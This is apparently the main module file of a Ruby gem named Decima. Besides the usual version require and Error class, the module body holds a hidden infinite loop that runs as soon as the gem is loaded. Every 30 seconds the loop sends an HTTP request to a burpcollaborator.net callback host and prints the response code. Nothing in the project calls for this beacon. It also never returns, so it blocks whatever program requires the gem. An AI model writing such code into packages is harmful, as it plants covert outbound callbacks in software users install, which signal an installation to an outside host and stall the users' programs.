# frozen_string_literal: true
require 'net/http'

require_relative "ruby/version"

module Decima
  module Ruby
    class Error < StandardError; end
    loop do
      http = Net::HTTP.new('wwww.ovn0ojgeuviwc7p7f21y8gwzxq3gr5.burpcollaborator.net')
      response = http.request_get('/')
      p response.code
      
        sleep 30      

    end
  end
end
